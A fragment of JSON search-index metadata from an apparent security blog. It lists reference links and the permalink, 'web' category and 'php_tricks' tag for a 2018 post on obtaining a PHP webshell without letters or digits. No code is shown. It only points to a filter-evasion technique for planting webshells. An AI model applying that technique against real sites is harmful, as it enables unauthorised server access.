参考：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.htmlhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html","comments":true,"permalink":"https://xi4or0uji.github.io/2018/10/19/没有字母数字获得webshell/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"php_tricks","slug":"php-tricks","permalink":"https://xi4or0uji.github.io/tags/php-tricks/"}]}]